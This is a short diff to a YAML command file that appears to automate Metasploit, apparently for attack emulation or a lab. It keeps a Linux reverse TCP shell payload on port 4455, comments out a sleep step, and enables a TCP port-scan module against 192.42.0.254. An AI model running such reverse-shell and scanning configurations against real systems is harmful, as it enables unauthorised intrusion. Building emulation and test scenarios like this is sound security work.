@@ -33,8 +33,8 @@ commands:
       LPORT: 4455
     payload: linux/x64/shell/reverse_tcp
 
-  - type: sleep
-    seconds: 60
+      #   - type: sleep
+      #     seconds: 60
 
       #  - type: msf-session
       #    stdapi: True
@@ -95,7 +95,7 @@ commands:
       #  - type: msf-session
       #    cmd: exit
 
-      #  - type: msf-module
-      #    cmd: auxiliary/scanner/portscan/tcp
-      #    options:
-      #      RHOSTS: 192.42.0.254
+  - type: msf-module
+    cmd: auxiliary/scanner/portscan/tcp
+    options:
+      RHOSTS: 192.42.0.254
